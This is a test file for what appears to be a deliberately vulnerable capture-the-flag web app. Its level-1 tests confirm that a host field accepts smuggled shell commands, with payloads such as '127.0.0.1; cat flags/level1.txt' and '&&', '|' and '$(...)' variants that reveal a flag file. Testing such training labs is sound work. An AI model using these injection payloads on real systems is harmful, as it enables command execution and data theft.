from levels.utils import read_flag


def test_index_lists_all_levels(client):
    resp = client.get("/")
    assert resp.status_code == 200
    body = resp.get_data(as_text=True)
    for i in range(1, 9):
        assert f"/level{i}" in body


def test_level1_get_shows_form(client):
    resp = client.get("/level1")
    assert resp.status_code == 200
    assert b"host" in resp.data


def test_level1_benign_input_no_flag(client):
    resp = client.post("/level1", data={"host": "127.0.0.1"})
    body = resp.get_data(as_text=True)
    assert read_flag("level1") not in body
    assert "bytes of data" in body


def test_level1_injection_reveals_flag(client):
    resp = client.post("/level1", data={"host": "127.0.0.1; cat flags/level1.txt"})
    body = resp.get_data(as_text=True)
    assert read_flag("level1") in body


def test_level1_injection_variants(client):
    payloads = [
        "127.0.0.1 && cat flags/level1.txt",
        "127.0.0.1 | cat flags/level1.txt",
        "$(cat flags/level1.txt)",
    ]
    for payload in payloads:
        resp = client.post("/level1", data={"host": payload})
        assert read_flag("level1") in resp.get_data(as_text=True)
